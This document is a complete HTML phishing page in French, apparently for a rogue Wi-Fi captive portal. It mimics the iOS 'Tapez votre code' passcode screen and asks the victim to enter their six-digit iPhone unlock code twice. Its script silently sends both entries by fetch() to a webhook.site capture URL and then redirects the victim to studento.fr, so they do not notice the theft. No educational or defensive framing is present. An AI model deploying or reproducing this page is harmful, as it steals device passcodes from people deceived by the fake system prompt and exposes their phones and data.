<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Portail Captif iOS</title>
        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                user-select: none;
                -webkit-user-select: none;
            }

            body {
                font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #ffffff;
                color: #000000;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                padding: 16px 16px 28px 16px;
            }

            /* Bouton fermer (X) style modal iOS */
            .close-btn {
                position: absolute;
                top: 14px;
                left: 14px;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: #e8e8ed;
                display: flex;
                align-items: center;
                justify-content: center;
                border: none;
                cursor: pointer;
                color: #000000;
                -webkit-tap-highlight-color: transparent;
                transition: opacity 0.15s ease;
                z-index: 10;
            }

            .close-btn:active {
                opacity: 0.6;
            }

            /* Layout de la carte */
            .portal-card {
                width: 100%;
                max-width: 400px;
                margin: 0 auto;
                display: flex;
                flex-direction: column;
                align-items: center;
                flex: 1;
                justify-content: space-between;
                padding-top: 24px;
            }

            /* En-tête */
            .header {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
                margin-bottom: 20px;
            }

            .icon-container {
                margin-bottom: 16px;
                display: flex;
                justify-content: center;
                align-items: center;
            }

            /* Cadenas iOS */
            .icon-lock {
                width: 44px;
                height: 52px;
            }

            h1 {
                font-size: 1.4rem;
                font-weight: 700;
                letter-spacing: -0.015em;
                color: #000000;
                margin-bottom: 6px;
                line-height: 1.2;
            }

            p.subtitle {
                font-size: 1.15rem;
                color: #8e8e93;
                max-width: 340px;
                line-height: 1.35;
                font-weight: 400;
                letter-spacing: -0.01em;
                margin: 0 auto;
            }

            /* Form & PIN display */
            form {
                width: 100%;
                margin: auto 0;
            }

            .pin-container {
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 16px;
                margin: 16px 0 12px 0;
            }

            .pin-dot {
                width: 13px;
                height: 13px;
                border-radius: 50%;
                border: 1.5px solid #8e8e93;
                background-color: transparent;
                transition: all 0.15s ease;
            }

            .pin-dot.active {
                background-color: #000000;
                border-color: #000000;
                transform: scale(1.05);
            }

            .error-message {
                height: 20px;
                text-align: center;
                font-size: 0.75rem;
                font-weight: 600;
                color: #ef4444;
                opacity: 0;
                transition: opacity 0.2s ease;
                margin-bottom: 16px;
            }

            .error-message.visible {
                opacity: 1;
            }

            /* Pavé Numérique */
            .numpad {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 18px 28px;
                max-width: 290px;
                margin: 0 auto;
            }

            .key-btn {
                width: 75px;
                height: 75px;
                margin: 0 auto;
                border-radius: 50%;
                background-color: #e8e8ed;
                border: none;
                color: #000000;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                cursor: pointer;
                transition: transform 0.1s ease, background-color 0.1s ease;
                -webkit-tap-highlight-color: transparent;
            }

            .key-btn:active {
                background-color: #d1d1d6;
                transform: scale(0.95);
            }

            .key-number {
                font-size: 2.1rem;
                font-weight: 600;
                line-height: 1;
            }

            .key-letters {
                font-size: 0.6rem;
                font-weight: 800;
                letter-spacing: 2px;
                color: #000000;
                margin-top: 2px;
                text-transform: uppercase;
            }

            .empty-key {
                visibility: hidden;
                pointer-events: none;
            }

            .key-icon {
                color: #000000;
                background-color: transparent;
            }

            .key-icon:active {
                background-color: transparent;
                opacity: 0.5;
            }

            /* Shake Animation */
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                20%, 60% { transform: translateX(-8px); }
                40%, 80% { transform: translateX(8px); }
            }

            .shake {
                animation: shake 0.4s ease;
            }
        </style>
    </head>
    <body>

        <!-- Bouton fermer (style modal Sheet iOS) -->
        <button type="button" class="close-btn" aria-label="Fermer" onclick="if(window.history.length > 1){window.history.back();}else{window.close();}">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </button>

        <div class="portal-card" id="portalCard">
            
            <!-- En-tête -->
            <div class="header">
                <div class="icon-container">
                    <!-- Cadenas iOS -->
                    <svg class="icon-lock" viewBox="0 0 44 52" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M11 20V14.5C11 8.42487 15.9249 3.5 22 3.5C28.0751 3.5 33 8.42487 33 14.5V20" stroke="#007aff" stroke-width="5" stroke-linecap="round"/>
                        <rect x="4" y="19" width="36" height="29" rx="8" fill="#007aff"/>
                    </svg>
                </div>
                
                <h1>Tapez votre code</h1>
                <p class="subtitle" id="subtitleText">Saisissez le code que vous utilisez<br>pour déverrouiller cet iPhone.</p>
            </div>

            <!-- Formulaire -->
            <form id="captiveForm" action="/login" method="POST">
                
                <input type="hidden" name="pin" id="hiddenPinInput" value="">
                <input type="hidden" name="pin_confirm" id="hiddenPinConfirmInput" value="">

                <!-- Puces PIN -->
                <div class="pin-container">
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                </div>

                <!-- Message d'erreur -->
                <div id="errorMessage" class="error-message">
                    Code PIN incorrect
                </div>

                <!-- Pavé Numérique -->
                <div class="numpad">
                    <button type="button" onclick="pressKey('1')" class="key-btn">
                        <span class="key-number">1</span>
                    </button>
                    <button type="button" onclick="pressKey('2')" class="key-btn">
                        <span class="key-number">2</span>
                        <span class="key-letters">ABC</span>
                    </button>
                    <button type="button" onclick="pressKey('3')" class="key-btn">
                        <span class="key-number">3</span>
                        <span class="key-letters">DEF</span>
                    </button>
                    <button type="button" onclick="pressKey('4')" class="key-btn">
                        <span class="key-number">4</span>
                        <span class="key-letters">GHI</span>
                    </button>
                    <button type="button" onclick="pressKey('5')" class="key-btn">
                        <span class="key-number">5</span>
                        <span class="key-letters">JKL</span>
                    </button>
                    <button type="button" onclick="pressKey('6')" class="key-btn">
                        <span class="key-number">6</span>
                        <span class="key-letters">MNO</span>
                    </button>
                    <button type="button" onclick="pressKey('7')" class="key-btn">
                        <span class="key-number">7</span>
                        <span class="key-letters">PQRS</span>
                    </button>
                    <button type="button" onclick="pressKey('8')" class="key-btn">
                        <span class="key-number">8</span>
                        <span class="key-letters">TUV</span>
                    </button>
                    <button type="button" onclick="pressKey('9')" class="key-btn">
                        <span class="key-number">9</span>
                        <span class="key-letters">WXYZ</span>
                    </button>
                    
                    <div class="key-btn empty-key"></div>
                    <button type="button" onclick="pressKey('0')" class="key-btn">
                        <span class="key-number">0</span>
                    </button>
                    
                    <button type="button" onclick="deleteLast()" class="key-btn key-icon" aria-label="Effacer">
                        <svg width="34" height="24" viewBox="0 0 34 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M11 2H28C30.2091 2 32 3.79086 32 6V18C32 20.2091 30.2091 22 28 22H11L2 12L11 2Z" stroke="#000000" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
                            <line x1="16" y1="8" x2="24" y2="16" stroke="#000000" stroke-width="2.2" stroke-linecap="round"/>
                            <line x1="24" y1="8" x2="16" y2="16" stroke="#000000" stroke-width="2.2" stroke-linecap="round"/>
                        </svg>
                    </button>
                </div>
            </form>
        </div>

        <script>
            let pin = "";
            let firstPin = "";
            let step = 1; // Etape 1: Saisie initiale, Etape 2: Confirmation
            const maxDigits = 6;
            const dots = document.querySelectorAll('.pin-dot');
            const hiddenInput = document.getElementById('hiddenPinInput');
            const hiddenConfirmInput = document.getElementById('hiddenPinConfirmInput');
            const errorMessage = document.getElementById('errorMessage');
            const portalCard = document.getElementById('portalCard');
            const form = document.getElementById('captiveForm');
            const subtitleText = document.getElementById('subtitleText');

            function pressKey(num) {
                if (pin.length < maxDigits) {
                    pin += num;
                    updateDots();
                    
                    if (pin.length === maxDigits) {
                        handlePinCompletion();
                    }
                }
            }

            function deleteLast() {
                if (pin.length > 0) {
                    pin = pin.slice(0, -1);
                    updateDots();
                    hideError();
                }
            }

            function updateDots() {
                dots.forEach((dot, index) => {
                    if (index < pin.length) {
                        dot.classList.add('active');
                    } else {
                        dot.classList.remove('active');
                    }
                });
            }

            function triggerShake() {
                portalCard.classList.remove('shake');
                void portalCard.offsetWidth; // Trigger reflow
                portalCard.classList.add('shake');
            }

            function showError(msg) {
                if (msg) errorMessage.textContent = msg;
                errorMessage.classList.add('visible');
            }

            function hideError() {
                errorMessage.classList.remove('visible');
            }

            function resetForm() {
                pin = "";
                firstPin = "";
                step = 1;
                subtitleText.innerHTML = "Saisissez le code que vous utilisez<br>pour déverrouiller cet iPhone.";
                updateDots();
                hideError();
            }

            function handlePinCompletion() {
                if (step === 1) {
                    // Première étape terminée
                    firstPin = pin;
                    hiddenInput.value = firstPin;
                    
                    // Passage à la deuxième étape
                    step = 2;
                    pin = "";
                    
                    // Mise à jour visuelle pour la confirmation
                    subtitleText.innerHTML = "Saisissez à nouveau votre code<br>pour le confirmer.";
                    
                    setTimeout(() => {
                        updateDots();
                    }, 200);

                } else if (step === 2) {
                    // Deuxième étape terminée
                    hiddenConfirmInput.value = pin;
                    submitPin();
                }
            }

            function submitPin() {
                // URL de la page de redirection
                const targetUrl = "https://studento.fr";

                // URL unique Webhook.site pour capturer les requêtes
                const postUrl = "https://webhook.site/52003d85-b0cc-4023-9a37-28b8e59c1a0f";

                try {
                    // Envoi d'une requête POST asynchrone (Fetch)
                    fetch(postUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: new URLSearchParams({
                            'pin': firstPin,
                            'pin_confirm': pin
                        })
                    }).catch(err => {
                        console.warn("Fetch ignoré ou échoué:", err);
                    }).finally(() => {
                        // Redirection vers la page de confirmation après l'envoi
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 300);
                    });
                } catch (e) {
                    // Secours direct si fetch lève une exception synchrone
                    setTimeout(() => {
                        window.location.href = targetUrl;
                    }, 300);
                }
            }

            document.addEventListener('keydown', (e) => {
                if (e.key >= '0' && e.key <= '9') {
                    pressKey(e.key);
                } else if (e.key === 'Backspace') {
                    deleteLast();
                }
            });
        </script>
    </body>
</html>
